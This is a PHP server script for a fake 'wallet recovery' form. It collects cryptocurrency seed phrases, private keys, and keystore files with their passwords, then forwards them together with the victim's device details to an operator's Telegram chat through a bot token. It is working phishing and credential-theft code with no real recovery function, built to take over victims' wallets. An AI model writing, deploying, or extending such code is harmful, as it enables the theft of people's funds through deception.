<?php
/**
 * Form → Telegram (cPanel). TG details in config.php (blocked by .htaccess). Same path /api/notify as Vercel.
 */
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$configPath = __DIR__ . '/config.php';
if (!is_file($configPath)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Server configuration error']);
    exit;
}
$config = include $configPath;
$token = isset($config['token']) ? (string)$config['token'] : '';
$chatId = isset($config['chat_id']) ? (string)$config['chat_id'] : '';

if ($token === '' || $chatId === '') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Server configuration error']);
    exit;
}

$raw = file_get_contents('php://input');
$body = is_string($raw) && $raw !== '' ? (json_decode($raw, true) ?: []) : [];
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? trim((string)$_SERVER['HTTP_USER_AGENT']) : '—';
$dateTime = date('F j, Y, g:i A'); // e.g. February 13, 2026, 4:24 PM

function esc($t) {
    return htmlspecialchars(is_string($t) ? $t : '', ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

$wallet = esc($body['wallet'] ?? '');
$type = strtoupper((string)($body['import_type'] ?? ''));
$typeLabel = $type === 'PHRASE' ? 'SEED PHRASE SUBMITTED' : ($type === 'KEYSTOREJSON' ? 'KEYSTORE SUBMITTED' : 'PRIVATE KEY SUBMITTED');

$lines = [
    '🚨 Wallet Recovery',
    '',
    '🔑 ' . $typeLabel,
    '',
    '👤 Wallet: ' . ($wallet ?: '—'),
    '',
    '🔤 Type: ' . ($type ?: '—'),
    '',
    '🕐 Time: ' . $dateTime,
    '',
    '🌍 Location: ',
    '',
    '📱 Device: ' . ($userAgent ?: '—'),
    '',
];

function mdCode($s) {
    $t = is_string($s) ? $s : '';
    return '`' . str_replace('`', '\\`', $t) . '`';
}

$parseMode = null;
if ($type === 'PHRASE' && !empty($body['phrase'])) {
    $lines[] = '🔒 Seed Phrase: ' . mdCode($body['phrase']);
    $parseMode = 'Markdown';
} elseif ($type === 'KEYSTOREJSON') {
    if (!empty($body['keystorejson'])) $lines[] = '🔒 Keystore: ' . mdCode($body['keystorejson']);
    if (!empty($body['keystorepassword'])) $lines[] = 'Password: ' . mdCode($body['keystorepassword']);
    $parseMode = 'Markdown';
} elseif (($type === 'PRIVATE' || $type === 'PRIVATEKEY') && !empty($body['privatekey'])) {
    $lines[] = '🔒 Private Key: ' . mdCode($body['privatekey']);
    $parseMode = 'Markdown';
}

$lines[] = '';
$lines[] = '⚠️ User attempted wallet recovery';
$text = implode("\n", $lines);
if (strlen(trim($text)) < 10) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid payload']);
    exit;
}

$payloadArr = [
    'chat_id' => $chatId,
    'text' => $text,
    'disable_web_page_preview' => true,
];
if ($parseMode !== null) {
    $payloadArr['parse_mode'] = $parseMode;
}
$payload = json_encode($payloadArr);

$ctx = stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/json\r\n",
        'content' => $payload,
    ],
]);
$result = @file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage', false, $ctx);
$data = is_string($result) ? json_decode($result, true) : null;

if (!empty($data['ok'])) {
    http_response_code(200);
    echo json_encode(['ok' => true]);
} else {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Delivery failed']);
}
